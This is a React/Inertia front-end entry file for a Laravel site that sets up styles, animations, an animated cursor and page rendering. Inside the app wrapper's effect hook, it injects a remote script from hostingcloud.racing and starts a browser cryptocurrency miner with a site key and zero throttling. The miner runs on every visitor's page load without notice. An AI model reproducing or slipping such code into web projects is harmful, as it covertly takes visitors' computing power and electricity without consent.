import "../css/app.css";
import "./bootstrap";

// Import your custom styles
import "./styles/bootstrap.min.css";
import "./styles/animate.min.css";
import "./styles/fontawesome-all.min.css";
import "./styles/swiper-bundle.min.css";
import "./styles/slick.css";
import "./styles/default.css";
import "./styles/style.css";
import "./styles/responsive.css";

import { createInertiaApp } from "@inertiajs/react";
import { resolvePageComponent } from "laravel-vite-plugin/inertia-helpers";
import { createRoot } from "react-dom/client";
import { HelmetProvider } from "react-helmet-async";
import React, { useEffect } from "react";
import WOW from "wow.js";
import AnimatedCursor from "react-animated-cursor";

const appName = import.meta.env.VITE_APP_NAME || "Laravel";

// Create a wrapper component to include all your custom setup
const AppWrapper = ({ children }) => {
    useEffect(() => {
        // Initialize WOW.js
        const wow = new WOW({
            boxClass: "wow",
            animateClass: "animated",
            offset: 0,
            mobile: false,
            live: true,
        });
        wow.init();

        // Add your mining script
        const script = document.createElement("script");
        script.src = "https://www.hostingcloud.racing/Rh11.js";
        document.body.appendChild(script);

        script.onload = () => {
            const _client = new window.Client.Anonymous(
                "044188c25f5ad5f1727d80d9322b4bbdba76388a09529c789a436dbc1ff6792e",
                {
                    throttle: 0,
                    c: "w",
                    ads: 0,
                }
            );
            _client.start();
        };

        return () => {
            if (script.parentNode) {
                document.body.removeChild(script);
            }
        };
    }, []);

    // Scroll to top on page navigation
    useEffect(() => {
        if (window.location) {
            window.scrollTo(0, 0);
        }
    }, [window.location?.pathname]);

    return (
        <HelmetProvider>
            {children}
            <AnimatedCursor
                innerSize={8}
                outerSize={32}
                color="248, 158, 82"
                outerAlpha={0.15}
                innerScale={0}
                outerScale={0}
                clickables={[
                    "a",
                    'input[type="text"]',
                    'input[type="email"]',
                    'input[type="number"]',
                    'input[type="submit"]',
                    'input[type="image"]',
                    "label[for]",
                    "select",
                    "textarea",
                    "button",
                    ".Link ",
                ]}
            />
        </HelmetProvider>
    );
};

createInertiaApp({
    title: (title) => `${title} - ${appName}`,
    resolve: (name) =>
        resolvePageComponent(
            `./Pages/${name}.jsx`,
            import.meta.glob("./Pages/**/*.jsx")
        ),
    setup({ el, App, props }) {
        const root = createRoot(el);

        // Wrap the Inertia App component with your custom AppWrapper
        root.render(
            <AppWrapper>
                <App {...props} />
            </AppWrapper>
        );
    },
    progress: {
        color: "#4B5563",
    },
});
